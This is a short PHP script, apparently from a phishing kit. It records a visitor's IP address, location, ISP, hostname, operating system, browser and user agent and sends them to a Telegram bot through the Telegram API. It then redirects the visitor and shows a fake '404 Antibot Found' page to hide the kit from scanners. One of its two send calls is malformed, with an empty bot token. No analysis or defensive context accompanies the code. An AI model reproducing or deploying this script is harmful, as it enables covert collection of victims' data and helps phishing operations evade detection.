<?php
require_once('./Exit.php');
$body.= " --------------  Information-------------- \n"."\n";
$body.= "IP Address:$ip"."\n";
$body.= "COUNTRY:$countryname"."\n";
$body.= "REGION:{$region}"."\n";
$body.= "Isp:{$isp}"."\n";
$body.= "HOSTNAME:" . $hostname . ""."\n";
$body.= "OS:{$os}"."\n";
$body.= "BROWSER:{$browser}"."\n"."\n";
$body.= "USER AGENT:{$_SERVER['HTTP_USER_AGENT']}"."\n";
function callAPI($url) {
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
$result = curl_exec($curl);
curl_close($curl);
}
$result = urlencode($body);
callAPI('https://api.telegram.org/bot/sendMessage?chat_id=' . $result . "&parse_mode=html");
callAPI('https://api.telegram.org/bot' . $Token . '/sendMessage?chat_id=' . $ChatID . '&text=' . $result . "&parse_mode=html");


header('Location: ' . $botExit);


die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Antibot Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this 404 server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');;
?>